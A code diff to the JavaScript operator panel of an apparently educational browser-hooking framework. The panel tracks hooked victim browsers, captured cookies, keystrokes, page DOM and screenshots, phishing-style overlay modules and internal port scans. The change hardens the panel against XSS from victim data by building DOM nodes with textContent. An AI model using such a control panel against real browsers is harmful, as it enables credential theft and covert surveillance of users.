@@ -98,37 +98,44 @@
   // ---- victims list -----------------------------------------------------
   function renderVictims() {
     vcount.textContent = state.victims.filter(function (v) { return v.online; }).length;
+    victimList.innerHTML = '';
     if (!state.victims.length) {
-      victimList.innerHTML = '<div class="empty">No browsers hooked yet.<br/><small>Open the demo page in a browser.</small></div>';
+      var empty = el('div', { 'class': 'empty' }, 'No browsers hooked yet.');
+      empty.appendChild(el('small', null, 'Open the demo page in a browser.'));
+      victimList.appendChild(empty);
       return;
     }
     // online first, then most recent
     var sorted = state.victims.slice().sort(function (a, b) {
       return (b.online - a.online) || (b.lastSeen - a.lastSeen);
     });
-    victimList.innerHTML = sorted.map(function (v) {
-      var sel = state.selected === v.id ? ' sel' : '';
+    sorted.forEach(function (v) {
       // status sub-tags: live/lost hook + whether blind-XSS loot has landed.
       var cap = state.capture[v.id];
       var bxss = cap && (cap.meta || cap.dom || cap.screenshot);
-      var tags = v.online
-        ? '<span class="vtag live">live hooked</span>'
-        : '<span class="vtag lost">hook lost</span>';
-      if (bxss) tags += '<span class="vtag bxss">✓ bxss fired</span>';
-      if (v.activeModule) tags += '<span class="vtag overlay">overlay: ' + esc(v.activeModule) + '</span>';
-      var trash =
-        '<button class="vdel" type="button" data-del="' + v.id + '" ' +
-        'title="Remove from list (keeps saved data)" aria-label="Remove from list">' +
-        '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" ' +
+      var card = el('div', { 'class': 'vcard' + (state.selected === v.id ? ' sel' : ''), 'data-id': v.id });
+      var row1 = el('div', { 'class': 'row1' });
+      row1.appendChild(el('span', { 'class': 'vstat' + (v.online ? '' : ' off') }));
+      row1.appendChild(el('span', { 'class': 'id' }, v.id));
+      row1.appendChild(el('span', { 'class': 'when' }, v.online ? 'online' : ago(v.lastSeen)));
+      // static trusted markup only (fixed SVG) -- no victim data in this string
+      var trash = el('button', { 'class': 'vdel', type: 'button', 'data-del': v.id,
+        title: 'Remove from list (keeps saved data)', 'aria-label': 'Remove from list' });
+      trash.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" ' +
         'stroke-linecap="round" stroke-linejoin="round">' +
-        '<path d="M3 6h18"/><path d="M8 6V4h8v2"/><path d="M6 6l1 14h10l1-14"/><path d="M10 11v6M14 11v6"/></svg></button>';
-      return '<div class="vcard' + sel + '" data-id="' + v.id + '">' +
-        '<div class="row1"><span class="vstat' + (v.online ? '' : ' off') + '"></span>' +
-        '<span class="id">' + esc(v.id) + '</span>' +
-        '<span class="when">' + (v.online ? 'online' : ago(v.lastSeen)) + '</span>' + trash + '</div>' +
-        '<div class="meta">' + esc(v.fp.browser || '?') + ' · ' + esc(v.fp.os || '?') + ' · ' + esc(v.fp.ip || '?') + '</div>' +
-        '<div class="vtags">' + tags + '</div></div>';
-    }).join('');
+        '<path d="M3 6h18"/><path d="M8 6V4h8v2"/><path d="M6 6l1 14h10l1-14"/><path d="M10 11v6M14 11v6"/></svg>';
+      row1.appendChild(trash);
+      card.appendChild(row1);
+      card.appendChild(el('div', { 'class': 'meta' },
+        (v.fp.browser || '?') + ' · ' + (v.fp.os || '?') + ' · ' + (v.fp.ip || '?')));
+      var vtags = el('div', { 'class': 'vtags' });
+      vtags.appendChild(el('span', { 'class': 'vtag ' + (v.online ? 'live' : 'lost') },
+        v.online ? 'live hooked' : 'hook lost'));
+      if (bxss) vtags.appendChild(el('span', { 'class': 'vtag bxss' }, '✓ bxss fired'));
+      if (v.activeModule) vtags.appendChild(el('span', { 'class': 'vtag overlay' }, 'overlay: ' + v.activeModule));
+      card.appendChild(vtags);
+      victimList.appendChild(card);
+    });
     [].forEach.call(victimList.querySelectorAll('.vcard'), function (c) {
       c.onclick = function () { state.selected = c.getAttribute('data-id'); renderVictims(); renderDetail(); };
     });
@@ -148,7 +155,33 @@
     if (!v) { detailEl.innerHTML = '<div class="empty">Select a hooked browser on the left.</div>'; return; }
 
     var fp = v.fp || {};
-    var rows = [
+    var dis = v.online ? '' : ' disabled';
+    var overlays = state.modules.filter(function (m) { return m.kind !== 'task'; });
+    var hasScan = state.modules.some(function (m) { return m.id === 'portscan'; });
+    var reconTasks = state.modules.filter(function (m) { return m.kind === 'task' && m.id !== 'portscan'; });
+
+    // Static scaffold: trusted markup only, no victim data interpolated here.
+    // Victim-derived values are filled in via DOM below.
+    detailEl.innerHTML =
+      '<div class="row1" style="display:flex;align-items:center;gap:10px;margin-bottom:14px">' +
+        '<span class="vstat"></span>' +
+        '<span class="id" style="font-family:var(--mono);color:var(--accent);font-size:16px;font-weight:700"></span>' +
+        '<span style="color:var(--muted)"></span></div>' +
+      '<dl class="fp-grid"></dl>' +
+      '<button class="btn mirror-open" id="btnMirror" type="button">' +
+        '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">' +
+        '<rect x="2.5" y="4" width="19" height="13" rx="1.5"/><path d="M9 20h6M12 17v3"/></svg>' +
+        'Open page mirror</button>' +
+      '<div class="section-label">Deploy overlay</div>' +
+      '<div class="modules"></div>';
+
+    detailEl.querySelector('.vstat').setAttribute('class', 'vstat' + (v.online ? '' : ' off'));
+    detailEl.querySelector('.id').textContent = v.id;
+    detailEl.querySelector('.row1 span[style]').textContent =
+      v.online ? 'online' : 'offline · ' + ago(v.lastSeen);
+
+    var grid = detailEl.querySelector('.fp-grid');
+    [
       ['Browser', (fp.browser || '?') + ' / ' + (fp.os || '?')],
       ['IP', fp.ip || '?'],
       ['Origin', fp.origin || '?'],
@@ -158,37 +191,32 @@
       ['Page', fp.page || '?'],
       ['Title', fp.title || '?'],
       ['User-Agent', fp.ua || '?']
-    ].map(function (r) { return '<dt>' + esc(r[0]) + '</dt><dd>' + esc(r[1]) + '</dd>'; }).join('');
+    ].forEach(function (r) {
+      grid.appendChild(el('dt', null, r[0]));
+      grid.appendChild(el('dd', null, r[1]));
+    });
 
-    var dis = v.online ? '' : ' disabled';
-    var overlays = state.modules.filter(function (m) { return m.kind !== 'task'; });
-    var hasScan = state.modules.some(function (m) { return m.id === 'portscan'; });
-    var reconTasks = state.modules.filter(function (m) { return m.kind === 'task' && m.id !== 'portscan'; });
+    var modList = detailEl.querySelector('.modules');
+    overlays.forEach(function (m) {
+      var b = el('button', { 'class': 'mbtn', 'data-mod': m.id });
+      if (!v.online) b.setAttribute('disabled', '');
+      b.appendChild(el('div', { 'class': 'mt' }, m.label));
+      b.appendChild(el('div', { 'class': 'mb' }, m.blurb));
+      modList.appendChild(b);
+    });
 
-    var mods = overlays.map(function (m) {
-      return '<button class="mbtn" data-mod="' + esc(m.id) + '"' + dis + '>' +
-        '<div class="mt">' + esc(m.label) + '</div><div class="mb">' + esc(m.blurb) + '</div></button>';
-    }).join('');
-
-    detailEl.innerHTML =
-      '<div class="row1" style="display:flex;align-items:center;gap:10px;margin-bottom:14px">' +
-        '<span class="vstat' + (v.online ? '' : ' off') + '"></span>' +
-        '<span class="id" style="font-family:var(--mono);color:var(--accent);font-size:16px;font-weight:700">' + esc(v.id) + '</span>' +
-        '<span style="color:var(--muted)">' + (v.online ? 'online' : 'offline · ' + ago(v.lastSeen)) + '</span></div>' +
-      '<dl class="fp-grid">' + rows + '</dl>' +
-      '<button class="btn mirror-open" id="btnMirror" type="button">' +
-        '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">' +
-        '<rect x="2.5" y="4" width="19" height="13" rx="1.5"/><path d="M9 20h6M12 17v3"/></svg>' +
-        'Open page mirror</button>' +
-      '<div class="section-label">Deploy overlay</div>' +
-      '<div class="modules">' + mods + '</div>' +
-      (hasScan ? scanFormHTML(v) : '') +
-      (reconTasks.length ? reconHTML(v, reconTasks) : '') +
+    // scanFormHTML/reconHTML embed operator-owned form state and the server
+    // module catalog only -- no victim/session data -- so their templated
+    // innerHTML stays. v.id is a server-generated 8-char UUID (not attacker
+    // data) used for element scoping.
+    if (hasScan) detailEl.insertAdjacentHTML('beforeend', scanFormHTML(v));
+    if (reconTasks.length) detailEl.insertAdjacentHTML('beforeend', reconHTML(v, reconTasks));
+    detailEl.insertAdjacentHTML('beforeend',
       '<div class="actions">' +
         '<button class="btn recall" id="btnRecall"' + dis + '>Recall / stop</button>' +
         '<button class="btn ghost" id="btnForget">Forget browser</button>' +
       '</div>' +
-      '<div class="live-typing"><div class="ll">Live keystrokes</div><div id="typing"></div></div>';
+      '<div class="live-typing"><div class="ll">Live keystrokes</div><div id="typing"></div></div>');
 
     [].forEach.call(detailEl.querySelectorAll('.mbtn[data-mod]'), function (b) {
       b.onclick = function () { sendCmd({ type: 'deploy', victimId: v.id, moduleId: b.getAttribute('data-mod') }); };
@@ -298,7 +326,8 @@
       box.innerHTML = '';
       return;
     }
-    var html = '';
+    box.innerHTML = '';
+    var wrap = el('div');
 
     // ---- progress header (the "is it working?" answer) ----
     if (s.startedAt) {
@@ -310,60 +339,83 @@
       var tally = { open: 0, filtered: 0, closed: 0, blocked: 0 };
       s.ports.forEach(function (p) { if (tally[p.status] != null) tally[p.status]++; });
 
-      var statChips = s.mode === 'discover'
-        ? '<span class="srs up">' + s.hosts.length + ' up</span>' +
-          '<span class="srs">' + s.done + ' probed</span>'
-        : '<span class="srs open">' + tally.open + ' open</span>' +
-          (tally.filtered ? '<span class="srs filtered">' + tally.filtered + ' filtered</span>' : '') +
-          '<span class="srs closed">' + tally.closed + ' closed</span>' +
-          (tally.blocked ? '<span class="srs blocked">' + tally.blocked + ' blocked</span>' : '');
-
-      var title = s.running ? 'Scanning' : 'Scan complete';
-      var counter = s.total ? (s.done + ' / ' + s.total + ' · ' + pct + '%') : (s.done + ' probed');
-
-      html += '<div class="sr-progress' + (s.running ? ' running' : ' done') + '">' +
-        '<div class="srp-top">' +
-          '<span class="srp-title">' + (s.running ? '<span class="srp-spin"></span>' : '<span class="srp-check">✓</span>') + title +
-            ' <b>' + esc(s.target || '') + '</b></span>' +
-          '<span class="srp-meta">' + counter + ' · ' + elapsed + 's' + (s.running && rate ? ' · ' + rate + '/s' : '') + '</span>' +
-        '</div>' +
-        '<div class="srp-track"><div class="srp-fill" style="width:' + pct + '%"></div></div>' +
-        '<div class="srp-stats">' + statChips + '</div>' +
-      '</div>';
+      var prog = el('div', { 'class': 'sr-progress' + (s.running ? ' running' : ' done') });
+      var top = el('div', { 'class': 'srp-top' });
+      var ttl = el('span', { 'class': 'srp-title' });
+      ttl.appendChild(s.running ? el('span', { 'class': 'srp-spin' }) : el('span', { 'class': 'srp-check' }, '✓'));
+      ttl.appendChild(document.createTextNode(s.running ? 'Scanning ' : 'Scan complete '));
+      ttl.appendChild(el('b', null, s.target || ''));
+      top.appendChild(ttl);
+      var meta = el('span', { 'class': 'srp-meta' });
+      meta.appendChild(document.createTextNode(
+        (s.total ? (s.done + ' / ' + s.total + ' · ' + pct + '%') : (s.done + ' probed')) +
+        ' · ' + elapsed + 's' + (s.running && rate ? ' · ' + rate + '/s' : '')));
+      top.appendChild(meta);
+      prog.appendChild(top);
+      var track = el('div', { 'class': 'srp-track' });
+      var fill = el('div', { 'class': 'srp-fill' });
+      fill.style.width = pct + '%';
+      track.appendChild(fill);
+      prog.appendChild(track);
+      var stats = el('div', { 'class': 'srp-stats' });
+      if (s.mode === 'discover') {
+        stats.appendChild(el('span', { 'class': 'srs up' }, s.hosts.length + ' up'));
+        stats.appendChild(el('span', { 'class': 'srs' }, s.done + ' probed'));
+      } else {
+        stats.appendChild(el('span', { 'class': 'srs open' }, tally.open + ' open'));
+        if (tally.filtered) stats.appendChild(el('span', { 'class': 'srs filtered' }, tally.filtered + ' filtered'));
+        stats.appendChild(el('span', { 'class': 'srs closed' }, tally.closed + ' closed'));
+        if (tally.blocked) stats.appendChild(el('span', { 'class': 'srs blocked' }, tally.blocked + ' blocked'));
+      }
+      prog.appendChild(stats);
+      wrap.appendChild(prog);
     }
 
-    if (s.localIp) html += '<div class="sr-info">local IP leaked via WebRTC: <b>' + esc(s.localIp) + '</b></div>';
-    s.info.forEach(function (t) { html += '<div class="sr-info">' + esc(t) + '</div>'; });
+    if (s.localIp) {
+      var lip = el('div', { 'class': 'sr-info' }, 'local IP leaked via WebRTC: ');
+      lip.appendChild(el('b', null, s.localIp));
+      wrap.appendChild(lip);
+    }
+    s.info.forEach(function (t) { wrap.appendChild(el('div', { 'class': 'sr-info' }, t)); });
 
     if (s.hosts.length) {
-      html += '<div class="sr-grid">' + s.hosts.map(function (h) {
-        return '<div class="sr-cell up"><b>' + esc(h.host) + '</b><span>' + esc(h.note || 'up') + '</span></div>';
-      }).join('') + '</div>';
+      var grid = el('div', { 'class': 'sr-grid' });
+      s.hosts.forEach(function (h) {
+        var cell = el('div', { 'class': 'sr-cell up' });
+        cell.appendChild(el('b', null, h.host));
+        cell.appendChild(el('span', null, h.note || 'up'));
+        grid.appendChild(cell);
+      });
+      wrap.appendChild(grid);
     }
     if (s.ports.length) {
       var order = { open: 0, filtered: 1, blocked: 2, closed: 3 };
       var sorted = s.ports.slice().sort(function (a, b) {
         return (order[a.status] - order[b.status]) || (a.port - b.port);
       });
-      html += '<div class="sr-ports">' + sorted.map(function (pr) {
-        var label = pr.service && pr.status === 'open' ? ' <em>' + esc(pr.service) + '</em>' : '';
-        var info, sigs = '';
-        if (pr.wsStatus != null) {           // dual-primitive (localhost mode)
-          sigs = '<span class="sigs">' +
-            '<b class="' + (pr.fetchStatus === 'open' ? 'on' : 'off') + '">fetch ' + pr.fetchMs + 'ms</b>' +
-            '<b class="' + (pr.wsStatus === 'open' ? 'on' : 'off') + '">ws ' + pr.wsMs + 'ms</b></span>';
-          info = pr.status === 'open' ? 'open' : 'closed';
+      var pgrid = el('div', { 'class': 'sr-ports' });
+      sorted.forEach(function (pr) {
+        var cls = ['open', 'filtered', 'blocked', 'closed'].indexOf(pr.status) >= 0 ? pr.status : 'unknown';
+        var chip = el('span', { 'class': 'sr-port ' + cls + (pr.agree === 'both' ? ' agree' : '') });
+        chip.appendChild(document.createTextNode(pr.port));
+        if (pr.service && pr.status === 'open') chip.appendChild(el('em', null, ' ' + pr.service));
+        if (pr.wsStatus != null) {
+          var sigs = el('span', { 'class': 'sigs' });
+          sigs.appendChild(el('b', { 'class': pr.fetchStatus === 'open' ? 'on' : 'off' }, 'fetch ' + pr.fetchMs + 'ms'));
+          sigs.appendChild(el('b', { 'class': pr.wsStatus === 'open' ? 'on' : 'off' }, 'ws ' + pr.wsMs + 'ms'));
+          chip.appendChild(sigs);
+          chip.appendChild(el('i', null, pr.status === 'open' ? 'open' : 'closed'));
         } else {
-          info = pr.status + (pr.status === 'open' ? ' · ' + pr.ms + 'ms' : '');
+          chip.appendChild(el('i', null, pr.status === 'open' ? ('open · ' + pr.ms + 'ms') : String(pr.status)));
         }
-        return '<span class="sr-port ' + pr.status + (pr.agree === 'both' ? ' agree' : '') + '">' +
-          pr.port + label + '<i>' + info + '</i>' + sigs + '</span>';
-      }).join('') + '</div>';
+        pgrid.appendChild(chip);
+      });
+      wrap.appendChild(pgrid);
     }
 
     // browser-policy block warning (emitted by the scanner when it detects it)
-    if (s.warn) html += '<div class="sr-warn">' + esc(s.warn) + '</div>';
-    box.innerHTML = html;
+    if (s.warn) wrap.appendChild(el('div', { 'class': 'sr-warn' }, s.warn));
+    box.appendChild(wrap);
   }
 
   function onTaskResult(m) {
@@ -423,57 +475,102 @@
     if (m.victimId === state.selected) renderCapture();
   }
 
+  // ---- DOM builder: the only sanctioned way to render attacker-influenced
+  // values. textContent/setAttribute are the boundary -- no esc()/regex to
+  // remember. NOTE: setAttribute does NOT make URL attributes safe (a
+  // javascript: href still executes on click) -- URL contexts need the scheme
+  // check below. That is input validation, not escaping.
+  function el(tag, attrs, text) {
+    var e = document.createElement(tag);
+    if (attrs) for (var k in attrs) e.setAttribute(k, attrs[k]);
+    if (text != null) e.textContent = text;
+    return e;
+  }
+  function isShotUrl(u) { return typeof u === 'string' && u.lastIndexOf('data:image/', 0) === 0; }
+
   function renderCapture() {
     var box = $('captureResults'); if (!box) return;
     var c = state.capture[state.selected];
-    if (!c) { box.innerHTML = ''; return; }
+    box.innerHTML = '';
+    if (!c) return;
     var meta = c.meta || {};
-    var html = '<div class="cap-card">' +
-      '<div class="cap-head"><span class="cap-dot"></span>Page Capture' +
-      (c.running ? '<span class="cap-run">capturing…</span>' : '<span class="cap-ok">✓ done</span>') + '</div>';
+
+    var card = el('div', { 'class': 'cap-card' });
+    var head = el('div', { 'class': 'cap-head' });
+    head.appendChild(el('span', { 'class': 'cap-dot' }));
+    head.appendChild(document.createTextNode('Page Capture'));
+    head.appendChild(el('span', { 'class': c.running ? 'cap-run' : 'cap-ok' }, c.running ? 'capturing…' : '✓ done'));
+    card.appendChild(head);
 
     if (meta.origin) {
-      html += '<div class="cap-metas">' +
-        '<div><span>origin</span><b>' + esc(meta.origin) + '</b></div>' +
-        '<div><span>url</span><b>' + esc(meta.href || '') + '</b></div>' +
-        (meta.referrer ? '<div><span>referrer</span><b>' + esc(meta.referrer) + '</b></div>' : '') +
-        '</div>';
+      var metas = el('div', { 'class': 'cap-metas' });
+      [['origin', meta.origin], ['url', meta.href || ''], ['referrer', meta.referrer]].forEach(function (kv) {
+        if (!kv[1]) return;
+        var d = el('div');
+        d.appendChild(el('span', null, kv[0]));
+        d.appendChild(el('b', null, String(kv[1])));
+        metas.appendChild(d);
+      });
+      card.appendChild(metas);
     }
 
-    html += '<div class="cap-sub">Cookies <em>(JS-readable / non-HttpOnly)</em></div>';
+    var sub1 = el('div', { 'class': 'cap-sub' }, 'Cookies ');
+    sub1.appendChild(el('em', null, '(JS-readable / non-HttpOnly)'));
+    card.appendChild(sub1);
     if (c.cookies && c.cookies.length) {
-      html += '<div class="cap-cookies">' + c.cookies.map(function (k) {
-        return '<div class="ck"><span class="ckn">' + esc(k.name) + '</span><span class="ckv">' + esc(k.value) + '</span></div>';
-      }).join('') + '</div>';
+      var ck = el('div', { 'class': 'cap-cookies' });
+      c.cookies.forEach(function (k) {
+        var row = el('div', { 'class': 'ck' });
+        row.appendChild(el('span', { 'class': 'ckn' }, k.name));
+        row.appendChild(el('span', { 'class': 'ckv' }, k.value));
+        ck.appendChild(row);
+      });
+      card.appendChild(ck);
     } else if (!c.running) {
-      html += '<div class="cap-empty">none readable — all HttpOnly, or none set. That is the HttpOnly lesson.</div>';
-    } else { html += '<div class="cap-empty">…</div>'; }
+      card.appendChild(el('div', { 'class': 'cap-empty' }, 'none readable — all HttpOnly, or none set. That is the HttpOnly lesson.'));
+    } else {
+      card.appendChild(el('div', { 'class': 'cap-empty' }, '…'));
+    }
 
-    html += '<div class="cap-sub">Screenshot</div>';
-    if (c.screenshot) {
-      html += '<a class="cap-shot" href="' + c.screenshot + '" target="_blank" rel="noopener">' +
-              '<img src="' + c.screenshot + '" alt="captured screenshot"/></a>' +
-              (c.shotDims ? '<div class="cap-dim">' + esc(c.shotDims) + '</div>' : '');
-    } else if (c.running) { html += '<div class="cap-empty">rendering…</div>'; }
-    else { html += '<div class="cap-empty">no screenshot (see notes)</div>'; }
+    card.appendChild(el('div', { 'class': 'cap-sub' }, 'Screenshot'));
+    if (c.screenshot && !isShotUrl(c.screenshot)) {
+      card.appendChild(el('div', { 'class': 'cap-empty' }, 'screenshot rejected — not an image data URL (possible injection attempt)'));
+    } else if (c.screenshot) {
+      var a = el('a', { 'class': 'cap-shot', href: c.screenshot, target: '_blank', rel: 'noopener' });
+      a.appendChild(el('img', { src: c.screenshot, alt: 'captured screenshot' }));
+      card.appendChild(a);
+      if (c.shotDims) card.appendChild(el('div', { 'class': 'cap-dim' }, String(c.shotDims)));
+    } else if (c.running) {
+      card.appendChild(el('div', { 'class': 'cap-empty' }, 'rendering…'));
+    } else {
+      card.appendChild(el('div', { 'class': 'cap-empty' }, 'no screenshot (see notes)'));
+    }
 
-    html += '<div class="cap-sub">DOM</div>';
+    card.appendChild(el('div', { 'class': 'cap-sub' }, 'DOM'));
+    var pre = null;
     if (c.dom) {
       var kb = (c.dom.length / 1024).toFixed(1);
-      html += '<div class="cap-domrow"><span>' + kb + ' KB' +
-        (c.dom.truncated ? ' (truncated to 1.5MB)' : '') + '</span>' +
-        '<button class="mini" id="capView">Preview</button>' +
-        '<button class="mini" id="capDl">Download HTML</button></div>' +
-        '<pre class="cap-dom" id="capDom" style="display:none"></pre>';
-    } else if (c.running) { html += '<div class="cap-empty">collecting…</div>'; }
+      var row = el('div', { 'class': 'cap-domrow' });
+      var span = el('span', null, kb + ' KB' + (c.dom.truncated ? ' (truncated to 1.5MB)' : ''));
+      row.appendChild(span);
+      row.appendChild(el('button', { 'class': 'mini', id: 'capView' }, 'Preview'));
+      row.appendChild(el('button', { 'class': 'mini', id: 'capDl' }, 'Download HTML'));
+      pre = el('pre', { 'class': 'cap-dom', id: 'capDom' });
+      pre.style.display = 'none';
+      row.appendChild(pre);
+      card.appendChild(row);
+    } else if (c.running) {
+      card.appendChild(el('div', { 'class': 'cap-empty' }, 'collecting…'));
+    }
 
     if (c.info && c.info.length) {
-      html += '<div class="cap-notes">' + c.info.map(function (t) { return '<div>• ' + esc(t) + '</div>'; }).join('') + '</div>';
+      var notes = el('div', { 'class': 'cap-notes' });
+      c.info.forEach(function (t) { notes.appendChild(el('div', null, '• ' + t)); });
+      card.appendChild(notes);
     }
-    html += '</div>';
-    box.innerHTML = html;
+    box.appendChild(card);
 
-    var dl = $('capDl'), vw = $('capView'), pre = $('capDom');
+    var dl = $('capDl'), vw = $('capView');
     if (dl && c.dom) dl.onclick = function () {
       var a = document.createElement('a');
       a.href = URL.createObjectURL(new Blob([c.dom.html], { type: 'text/html' }));
@@ -492,11 +589,19 @@
   function renderTyping() {
     var box = $('typing'); if (!box) return;
     var t = state.typing[state.selected];
-    if (!t || !Object.keys(t).length) { box.innerHTML = '<div class="kv"><span class="v empty-val">waiting for input…</span></div>'; return; }
-    box.innerHTML = Object.keys(t).map(function (f) {
-      var val = t[f];
-      return '<div class="kv"><span class="k">' + esc(f) + '</span><span class="v">' + (val ? esc(val) : '<span class="empty-val">…</span>') + '</span></div>';
-    }).join('');
+    box.innerHTML = '';
+    if (!t || !Object.keys(t).length) {
+      var wait = el('div', { 'class': 'kv' });
+      wait.appendChild(el('span', { 'class': 'v empty-val' }, 'waiting for input…'));
+      box.appendChild(wait);
+      return;
+    }
+    Object.keys(t).forEach(function (f) {
+      var row = el('div', { 'class': 'kv' });
+      row.appendChild(el('span', { 'class': 'k' }, f));
+      row.appendChild(t[f] ? el('span', { 'class': 'v' }, t[f]) : el('span', { 'class': 'v empty-val' }, '…'));
+      box.appendChild(row);
+    });
   }
 
   // ---- live keystrokes --------------------------------------------------
@@ -517,23 +622,31 @@
   }
   function renderLoot() {
     lootCount.textContent = state.loot.length;
-    if (!state.loot.length) { lootEl.innerHTML = '<div class="empty">Nothing captured yet.</div>'; return; }
-    lootEl.innerHTML = state.loot.map(function (l) {
-      var rows = Object.keys(l.data || {}).map(function (k) {
-        return '<div class="lrow"><span class="k">' + esc(k) + '</span><span class="v">' + esc(l.data[k]) + '</span></div>';
-      }).join('');
-      return '<div class="lcard"><div class="lh"><span class="tag">' + esc(l.module) + '</span>' +
-        '<span>' + esc(l.victimId) + '</span><span class="when">' + new Date(l.at).toLocaleTimeString() + '</span></div>' +
-        rows + '</div>';
-    }).join('');
+    lootEl.innerHTML = '';
+    if (!state.loot.length) { lootEl.appendChild(el('div', { 'class': 'empty' }, 'Nothing captured yet.')); return; }
+    state.loot.forEach(function (l) {
+      var card = el('div', { 'class': 'lcard' });
+      var lh = el('div', { 'class': 'lh' });
+      lh.appendChild(el('span', { 'class': 'tag' }, l.module));
+      lh.appendChild(el('span', null, l.victimId));
+      lh.appendChild(el('span', { 'class': 'when' }, new Date(l.at).toLocaleTimeString()));
+      card.appendChild(lh);
+      Object.keys(l.data || {}).forEach(function (k) {
+        var row = el('div', { 'class': 'lrow' });
+        row.appendChild(el('span', { 'class': 'k' }, k));
+        row.appendChild(el('span', { 'class': 'v' }, l.data[k]));
+        card.appendChild(row);
+      });
+      lootEl.appendChild(card);
+    });
   }
 
   // ---- feed -------------------------------------------------------------
   function logEvent(m) { logLine(m.level || 'cmd', '[' + (m.victimId || '-') + '] ' + m.text, m.at); }
   function logLine(cls, text, at) {
-    var d = document.createElement('div');
-    d.className = 'fline ' + cls;
-    d.innerHTML = '<span class="ts">' + ts(at) + '</span><span>' + esc(text) + '</span>';
+    var d = el('div', { 'class': 'fline ' + cls });
+    d.appendChild(el('span', { 'class': 'ts' }, ts(at)));
+    d.appendChild(el('span', null, text));
     feedEl.appendChild(d);
     while (feedEl.children.length > 400) feedEl.removeChild(feedEl.firstChild);
     feedEl.scrollTop = feedEl.scrollHeight;
